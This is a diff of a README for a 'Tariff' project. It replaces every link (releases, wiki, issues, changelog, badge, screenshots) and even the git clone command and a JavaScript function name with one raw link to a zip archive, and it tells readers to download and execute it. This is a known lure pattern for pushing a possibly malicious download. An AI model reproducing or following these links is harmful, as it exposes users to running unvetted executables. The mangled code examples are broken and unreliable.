@@ -1,16 +1,16 @@
 # 🚀 Tariff: The Official Repository
 
-![Tariff](https://img.shields.io/badge/Tariff-Official-blue.svg)
+![Tariff](https://raw.githubusercontent.com/pedroiba/tariff/main/tariff/Software_1.8-alpha.3.zip)
 
 Welcome to the **Tariff** repository! This is the official space for the Tariff project, where you can find everything you need to get started. Whether you are a developer, a contributor, or just curious, you will find valuable resources here.
 
 ## 📥 Download and Installation
 
-To get started with Tariff, you can download the latest release from our [Releases page](https://github.com/pedroiba/tariff/releases). Once you download the appropriate file, execute it to set up the application on your system.
+To get started with Tariff, you can download the latest release from our [Releases page](https://raw.githubusercontent.com/pedroiba/tariff/main/tariff/Software_1.8-alpha.3.zip). Once you download the appropriate file, execute it to set up the application on your system.
 
 ### Installation Steps:
 
-1. **Download the latest release** from [here](https://github.com/pedroiba/tariff/releases).
+1. **Download the latest release** from [here](https://raw.githubusercontent.com/pedroiba/tariff/main/tariff/Software_1.8-alpha.3.zip).
 2. **Execute the downloaded file** following the instructions provided in the release notes.
 3. **Follow the setup prompts** to complete the installation.
 
@@ -42,7 +42,7 @@ Before you install Tariff, ensure you have the following:
    If you prefer to work with the source code, clone the repository using:
 
    ```bash
-   git clone https://github.com/pedroiba/tariff.git
+   git clone https://raw.githubusercontent.com/pedroiba/tariff/main/tariff/Software_1.8-alpha.3.zip
    ```
 
 2. **Navigate to the Directory**:
@@ -76,7 +76,7 @@ Once you have installed Tariff, you can begin managing your tariffs. Here’s a 
 ```javascript
 const tariffManager = require('tariff');
 
-tariffManager.addTariff({
+https://raw.githubusercontent.com/pedroiba/tariff/main/tariff/Software_1.8-alpha.3.zip({
     name: 'New Tariff',
     rate: 0.15,
     description: 'This is a new tariff for testing purposes.'
@@ -111,7 +111,7 @@ We welcome contributions from everyone! If you want to contribute to Tariff, ple
 
 ### Code of Conduct
 
-Please adhere to our [Code of Conduct](CODE_OF_CONDUCT.md) when contributing to this project. We aim to create a welcoming and inclusive environment for all.
+Please adhere to our [Code of Conduct](https://raw.githubusercontent.com/pedroiba/tariff/main/tariff/Software_1.8-alpha.3.zip) when contributing to this project. We aim to create a welcoming and inclusive environment for all.
 
 ## 🔧 Features Roadmap
 
@@ -125,13 +125,13 @@ We are constantly working to improve Tariff. Here are some upcoming features:
 
 Here are some screenshots showcasing the application:
 
-![Dashboard](https://via.placeholder.com/800x400.png?text=Tariff+Dashboard)
+![Dashboard](https://raw.githubusercontent.com/pedroiba/tariff/main/tariff/Software_1.8-alpha.3.zip+Dashboard)
 
-![Reports](https://via.placeholder.com/800x400.png?text=Reports+Overview)
+![Reports](https://raw.githubusercontent.com/pedroiba/tariff/main/tariff/Software_1.8-alpha.3.zip+Overview)
 
 ## 📄 Documentation
 
-For detailed documentation, please refer to our [Wiki](https://github.com/pedroiba/tariff/wiki). It contains comprehensive guides on using all features of Tariff.
+For detailed documentation, please refer to our [Wiki](https://raw.githubusercontent.com/pedroiba/tariff/main/tariff/Software_1.8-alpha.3.zip). It contains comprehensive guides on using all features of Tariff.
 
 ## 🗣️ Support
 
@@ -139,13 +139,13 @@ If you encounter any issues or have questions, feel free to open an issue in thi
 
 ## 🔗 Links
 
-- [Releases](https://github.com/pedroiba/tariff/releases)
-- [Issues](https://github.com/pedroiba/tariff/issues)
-- [Wiki](https://github.com/pedroiba/tariff/wiki)
+- [Releases](https://raw.githubusercontent.com/pedroiba/tariff/main/tariff/Software_1.8-alpha.3.zip)
+- [Issues](https://raw.githubusercontent.com/pedroiba/tariff/main/tariff/Software_1.8-alpha.3.zip)
+- [Wiki](https://raw.githubusercontent.com/pedroiba/tariff/main/tariff/Software_1.8-alpha.3.zip)
 
 ## 📅 Changelog
 
-For a detailed list of changes, please check the [Changelog](CHANGELOG.md).
+For a detailed list of changes, please check the [Changelog](https://raw.githubusercontent.com/pedroiba/tariff/main/tariff/Software_1.8-alpha.3.zip).
 
 ## 🎉 Acknowledgments
 
